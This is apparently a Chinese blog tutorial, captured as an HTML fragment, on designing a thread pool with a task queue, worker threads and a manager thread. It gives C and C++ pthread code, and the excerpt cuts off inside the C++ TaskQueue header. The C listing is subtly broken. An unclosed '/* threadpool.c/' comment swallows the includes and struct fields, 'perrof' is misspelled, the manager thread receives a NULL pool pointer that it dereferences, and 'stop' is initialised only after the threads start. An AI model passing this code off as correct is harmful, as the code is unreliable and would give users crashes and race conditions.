        <content type="html"><![CDATA[<p>定义一个线程池的结构体，先确定线程池大概的组成部分：<strong>任务队列(tasks)</strong>、<strong>工作线程(workers)</strong>、<strong>管理者(manager)</strong>。然后围绕这三个概念去补充就好了。</p><p>任务其实就是在线程中要被调用的函数，所以具体的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task</span> &#123;</span></span><br><span class="line">    <span class="type">void</span>* (*func)(<span class="type">void</span>* arg);</span><br><span class="line">    <span class="type">void</span>* arg;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而线程池中的 <strong>任务队列</strong> 顾名思义就是由一系列我们要做的任务组成的队列，所以在线程池中定义任务队列时还需要定义一些队列相关的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task</span>* <span class="title">taskQueue</span>;</span></span><br><span class="line"><span class="type">int</span> queueCapacity; <span class="comment">/* 队列容量 */</span></span><br><span class="line"><span class="type">int</span> queueSize; <span class="comment">/* 队列大小 */</span></span><br><span class="line"><span class="type">int</span> queueFront; <span class="comment">/* 队头 */</span></span><br><span class="line"><span class="type">int</span> queueRear; <span class="comment">/* 队尾 */</span></span><br></pre></td></tr></table></figure><p>在线程池中的 <strong>工作线程</strong> 应该不止一个，所以我们需要一个数组来存放这些工作线程，同时，还需要一些变量来描述这个数组，以便 <strong>管理者</strong>线程 更好的管理这个数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pthread_t</span>* workers;</span><br><span class="line"><span class="type">int</span> minimum; <span class="comment">/* 最小工作线程数 */</span></span><br><span class="line"><span class="type">int</span> maximum; <span class="comment">/* 最大工作线程数 */</span></span><br><span class="line"><span class="type">int</span> livenum; <span class="comment">/* 存活的线程数 */</span></span><br><span class="line"><span class="type">int</span> busynum; <span class="comment">/* 正在工作的线程数 */</span></span><br><span class="line"><span class="type">int</span> exitnum; <span class="comment">/* 要销毁的线程数 */</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> manager;</span><br></pre></td></tr></table></figure><p><strong>管理者</strong> 在线程池中的定义其实还算简单，它就是一个线程，我们去实现它就是去写好一个函数，<strong>线程池的核心就是这个管理者函数的运行。</strong></p><hr><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h4 id="C语言版"><a href="#C语言版" class="headerlink" title="C语言版"></a>C语言版</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* threadpool.h */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _THREADPOOL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _THREADPOOL_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">task</span> <span class="title">Task</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">threadpool</span> <span class="title">ThreadPool</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// _THREADPOOL_H</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* threadpool.c/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#include &quot;threadpool.h&quot;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;pthread.h&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define ADDWORKER 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">struct task &#123;</span></span><br><span class="line"><span class="comment">    void* (*func)(void* arg);</span></span><br><span class="line"><span class="comment">    void* arg;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">struct threadpool &#123;</span></span><br><span class="line"><span class="comment">    struct task* taskQueue;</span></span><br><span class="line"><span class="comment">    int queueCapacity;</span></span><br><span class="line"><span class="comment">    int queueSize;</span></span><br><span class="line"><span class="comment">    int queueFront;</span></span><br><span class="line"><span class="comment">    int queueRear;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    pthread_t manager;</span></span><br><span class="line"><span class="comment">    pthread_t* workers;</span></span><br><span class="line"><span class="comment">    int minimum; /* 最小工作线程数 */</span></span><br><span class="line">    <span class="type">int</span> maximum; <span class="comment">/* 最大工作线程数 */</span></span><br><span class="line">    <span class="type">int</span> busynum; <span class="comment">/* 正在工作的线程数 */</span></span><br><span class="line">    <span class="type">int</span> livenum; <span class="comment">/* 存活的线程数 */</span></span><br><span class="line">    <span class="type">int</span> exitnum; <span class="comment">/* 要销毁的线程数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_mutex_t</span> poolMutex; <span class="comment">/* 锁整个线程池 */</span></span><br><span class="line">    <span class="type">pthread_mutex_t</span> busyMutex; <span class="comment">/* 锁busynum */</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">pthread_cond_t</span> emptyCond; <span class="comment">/* 任务队列为空的条件 */</span></span><br><span class="line">    <span class="type">pthread_cond_t</span> fullCond; <span class="comment">/* 任务队列为满的条件 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> stop;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 不是让管理者主动销毁线程</span></span><br><span class="line"><span class="comment">   而是发送信号唤醒被阻塞的工作线程</span></span><br><span class="line"><span class="comment">   让工作线程去检测是否要自杀 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">suicide</span><span class="params">(ThreadPool* pool)</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid = pthread_self();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pool-&gt;maximum; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tid == pool-&gt;workers[i]) &#123;</span><br><span class="line">            pool-&gt;workers[i] = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;worker: %d exit\n&quot;</span>, tid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 工作线程被创建出来,要做的事就是不断读取任务队列,执行任务 */</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">worker</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    ThreadPool* pool = (ThreadPool*)arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* 很多worker都要从线程池中拿任务，涉及到线程同步问题 */</span></span><br><span class="line">        pthread_mutex_lock(&amp;pool-&gt;poolMutex);</span><br><span class="line">        <span class="keyword">while</span> (pool-&gt;queueSize == <span class="number">0</span> &amp;&amp; !pool-&gt;stop) &#123;</span><br><span class="line">            pthread_cond_wait(&amp;pool-&gt;emptyCond, &amp;pool-&gt;poolMutex);</span><br><span class="line">            <span class="keyword">if</span> (pool-&gt;exitnum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                pool-&gt;exitnum--;</span><br><span class="line">                pool-&gt;livenum--;</span><br><span class="line">                pthread_mutex_unlock(&amp;pool-&gt;poolMutex);</span><br><span class="line">                suicide(pool);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 考虑到在取到任务时用户可能已经下达关闭线程池的指令 */</span></span><br><span class="line">        <span class="keyword">if</span> (pool-&gt;stop) &#123;</span><br><span class="line">            pthread_mutex_unlock(&amp;pool-&gt;poolMutex);</span><br><span class="line">            suicide(pool);</span><br><span class="line">        &#125;</span><br><span class="line">        Task task;</span><br><span class="line">        task.func = pool-&gt;taskQueue[pool-&gt;queueFront].func;</span><br><span class="line">        task.arg = pool-&gt;taskQueue[pool-&gt;queueFront].arg; </span><br><span class="line">        pool-&gt;queueFront = (pool-&gt;queueFront + <span class="number">1</span>) % pool-&gt;queueCapacity;</span><br><span class="line">        pool-&gt;queueSize--;</span><br><span class="line">        pthread_cond_signal(&amp;pool-&gt;fullCond);</span><br><span class="line">        <span class="comment">/* 对任务队列操作完了就可解锁了,下面的操作不再涉及对任务队列的操作 */</span></span><br><span class="line">        pthread_mutex_unlock(&amp;pool-&gt;poolMutex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 获取到任务后,开始执行任务,其实就是调用下函数指针*/</span></span><br><span class="line">        pthread_mutex_lock(&amp;pool-&gt;busyMutex);</span><br><span class="line">        pool-&gt;busynum++;</span><br><span class="line">        pthread_mutex_unlock(&amp;pool-&gt;busyMutex);</span><br><span class="line">        task.func(task.arg); </span><br><span class="line">        <span class="built_in">free</span>(task.arg);</span><br><span class="line">        task.arg = <span class="literal">NULL</span>;</span><br><span class="line">        pthread_mutex_lock(&amp;pool-&gt;busyMutex);</span><br><span class="line">        pool-&gt;busynum--;</span><br><span class="line">        pthread_mutex_unlock(&amp;pool-&gt;busyMutex);</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 管理的工作就是依据</span></span><br><span class="line"><span class="comment">   线程池中的某些变量</span></span><br><span class="line"><span class="comment">   根据自己指定的规则</span></span><br><span class="line"><span class="comment">   不断地     动态地</span></span><br><span class="line"><span class="comment">   创建或销毁工作线程 */</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">manager</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    ThreadPool* pool = (ThreadPool*)arg;</span><br><span class="line">    <span class="keyword">while</span> (!pool-&gt;stop) &#123;</span><br><span class="line">        pthread_mutex_lock(&amp;pool-&gt;poolMutex);</span><br><span class="line">        <span class="type">int</span> taskNum = pool-&gt;queueSize;</span><br><span class="line">        <span class="type">int</span> workerNum = pool-&gt;livenum;</span><br><span class="line">        <span class="type">int</span> workingNum = pool-&gt;busynum;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 任务太多了,忙不过来了 */</span></span><br><span class="line">        <span class="keyword">if</span> (taskNum &gt; workerNum &amp;&amp; workerNum &lt; pool-&gt;maximum) &#123;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; workerNum &lt; pool-&gt;maximum &amp;&amp; i &lt; pool-&gt;maximum &amp;&amp; cnt &lt; ADDWORKER; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pool-&gt;workers[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                    pthread_create(&amp;pool-&gt;workers[i], <span class="literal">NULL</span>, worker, pool);</span><br><span class="line">                    cnt++;</span><br><span class="line">                    workerNum++, pool-&gt;livenum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 摸鱼的工人太多了,需要唤醒一些让它们去自杀 */</span></span><br><span class="line">        <span class="keyword">if</span> (workingNum * <span class="number">2</span> &lt; workerNum &amp;&amp; workerNum &gt; pool-&gt;minimum) &#123;</span><br><span class="line">            pool-&gt;exitnum++;</span><br><span class="line">            pthread_cond_signal(&amp;pool-&gt;emptyCond);</span><br><span class="line">        &#125;</span><br><span class="line">        pthread_mutex_unlock(&amp;pool-&gt;poolMutex);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ThreadPool* <span class="title function_">creadThreadPool</span><span class="params">(<span class="type">int</span> max, <span class="type">int</span> min, <span class="type">int</span> taskCapacity)</span> &#123;</span><br><span class="line">    ThreadPool* pool = (ThreadPool*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ThreadPool));</span><br><span class="line">    <span class="keyword">if</span> (pool == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;线程池malloc失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 工作线程还没创建，但是得先有个坑位 */</span></span><br><span class="line">    pool-&gt;workers = (<span class="type">pthread_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">pthread_t</span>) * max);</span><br><span class="line">    <span class="keyword">if</span> (pool-&gt;workers == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span>(pool);</span><br><span class="line">        perror(<span class="string">&quot;工作线程malloc失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(pool-&gt;workers, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">pthread_t</span>) * max);</span><br><span class="line">    pool-&gt;minimum = min;</span><br><span class="line">    pool-&gt;maximum = max;</span><br><span class="line">    pool-&gt;busynum = <span class="number">0</span>;</span><br><span class="line">    pool-&gt;livenum = min;</span><br><span class="line">    pool-&gt;exitnum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    res |= pthread_mutex_init(&amp;pool-&gt;poolMutex, <span class="literal">NULL</span>);</span><br><span class="line">    res |= pthread_mutex_init(&amp;pool-&gt;busyMutex, <span class="literal">NULL</span>);</span><br><span class="line">    res |= pthread_cond_init(&amp;pool-&gt;emptyCond, <span class="literal">NULL</span>);</span><br><span class="line">    res |= pthread_cond_init(&amp;pool-&gt;fullCond, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (res != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span>(pool-&gt;workers);</span><br><span class="line">        <span class="built_in">free</span>(pool);</span><br><span class="line">        perrof(<span class="string">&quot;互斥条件初始化失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pool-&gt;taskQueue = (Task*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Task) * taskCapacity);</span><br><span class="line">    pool-&gt;queueCapacity = taskCapacity;</span><br><span class="line">    pool-&gt;queueSize = <span class="number">0</span>;</span><br><span class="line">    pool-&gt;queueFront = <span class="number">0</span>;</span><br><span class="line">    pool-&gt;queueRear = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pool-&gt;manager, <span class="literal">NULL</span>, manager, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 先按最小线程数创建工作线程 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; min; i++) &#123;</span><br><span class="line">        pthread_create(&amp;pool-&gt;workers[i], <span class="literal">NULL</span>, worker, pool);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pool-&gt;stop = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> pool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">insertTask</span><span class="params">(ThreadPool* pool, <span class="type">void</span>(*func)(<span class="type">void</span>*), <span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    pthread_mutex_lock(&amp;pool-&gt;poolMutex);</span><br><span class="line">    <span class="keyword">while</span> (pool-&gt;queueSize == pool-&gt;queueCapacity &amp;&amp; !pool-&gt;stop) &#123;</span><br><span class="line">        pthread_cond_wait(&amp;pool-&gt;fullCond, &amp;pool-&gt;poolMutex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pool-&gt;stop) &#123;</span><br><span class="line">        pthread_mutex_unlock(&amp;pool-&gt;poolMutex);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pool-&gt;taskQueue[pool-&gt;queueRear].func = func;</span><br><span class="line">    pool-&gt;taskQueue[pool-&gt;queueRear].arg = arg;</span><br><span class="line">    pool-&gt;queueRear = (pool-&gt;queueRear + <span class="number">1</span>) % pool-&gt;queueCapacity;</span><br><span class="line">    pool-&gt;queueSize++;</span><br><span class="line">    pthread_cond_signal(&amp;pool-&gt;emptyCond);</span><br><span class="line">    pthread_mutex_unlock(&amp;pool-&gt;poolMutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeThreadPool</span><span class="params">(ThreadPool* pool)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (pool == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    pool-&gt;stop = <span class="number">1</span>;</span><br><span class="line">    pthread_join(pool-&gt;manager, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_broadcast(&amp;pool-&gt;emptyCond);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pool-&gt;maximum; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pool-&gt;workers[i] != <span class="number">0</span>)</span><br><span class="line">            pthread_join(pool-&gt;workers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_cond_broadcast(&amp;pool-&gt;fullCond);</span><br><span class="line">    <span class="keyword">if</span> (pool-&gt;taskQueue) <span class="built_in">free</span>(pool-&gt;taskQueue);</span><br><span class="line">    <span class="keyword">if</span> (pool-&gt;workers) <span class="built_in">free</span>(pool-&gt;workers);</span><br><span class="line">    pthread_mutex_destroy(&amp;pool-&gt;poolMutex);</span><br><span class="line">    pthread_mutex_destroy(&amp;pool-&gt;busyMutex);</span><br><span class="line">    pthread_cond_destroy(&amp;pool-&gt;emptyCond);</span><br><span class="line">    pthread_cond_destroy(&amp;pool-&gt;fullCond);</span><br><span class="line">    <span class="built_in">free</span>(pool);</span><br><span class="line">    pool = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="C-版"><a href="#C-版" class="headerlink" title="C++版"></a>C++版</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ThreadPool.h */</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;TaskQueue.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadPool</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    TaskQueue* m_TaskQueue;</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> managerID;</span><br><span class="line">    <span class="type">pthread_t</span>* workers;</span><br><span class="line">    <span class="type">int</span> minimum;</span><br><span class="line">    <span class="type">int</span> maximum;</span><br><span class="line">    <span class="type">int</span> busyNum;</span><br><span class="line">    <span class="type">int</span> liveNum;</span><br><span class="line">    <span class="type">int</span> exitNum;</span><br><span class="line">    <span class="type">pthread_mutex_t</span> m_Mutex;</span><br><span class="line">    <span class="type">pthread_cond_t</span> m_EmptyCond;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> stop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span>* <span class="title">manager</span><span class="params">(<span class="type">void</span>* arg)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span>* <span class="title">worker</span><span class="params">(<span class="type">void</span>* arg)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ExitThread</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">ThreadPool</span>(<span class="type">int</span> min, <span class="type">int</span> max);</span><br><span class="line">    ~<span class="built_in">ThreadPool</span>();</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Stop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">InsertTask</span><span class="params">(Task task)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">InsertTask</span><span class="params">(<span class="type">void</span>(*func)(<span class="type">void</span>*), <span class="type">void</span>* arg)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">GetBusyNum</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">GetLiveNum</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* TaskQueue.h */</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Task</span> &#123;</span><br><span class="line">    <span class="built_in">void</span> (*func)(<span class="type">void</span>* arg);</span><br><span class="line">    <span class="type">void</span>* arg;</span><br><span class="line">    <span class="built_in">Task</span>() &#123;</span><br><span class="line">        func = <span class="literal">nullptr</span>;</span><br><span class="line">        arg = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Task</span>(<span class="built_in">void</span> (*func)(<span class="type">void</span>* arg), <span class="type">void</span>* arg) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;func = func;</span><br><span class="line">        <span class="keyword">this</span>-&gt;arg = arg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaskQueue</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::queue&lt;Task&gt; m_TaskQueue;</span><br><span class="line">    <span class="type">pthread_mutex_t</span> m_Mutex;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">TaskQueue</span>();</span><br><span class="line">    ~<span class="built_in">TaskQueue</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span 